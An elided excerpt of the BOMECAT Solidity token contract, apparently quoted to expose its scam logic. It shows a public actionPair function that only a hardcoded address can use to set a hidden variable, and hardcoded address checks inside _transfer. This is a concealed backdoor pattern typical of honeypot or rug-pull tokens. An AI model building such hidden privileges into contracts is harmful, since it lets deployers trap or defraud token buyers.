...
contract BOMECAT is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0xc9cBcb0eDeFc0c9E3e53Ac51cb8113446f5a716C) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         ...
         from  != 0xc9cBcb0eDeFc0c9E3e53Ac51cb8113446f5a716C 
    ...
    constructor() {
        _name = unicode"BOMECAT";
        _symbol = unicode"BOMECAT";
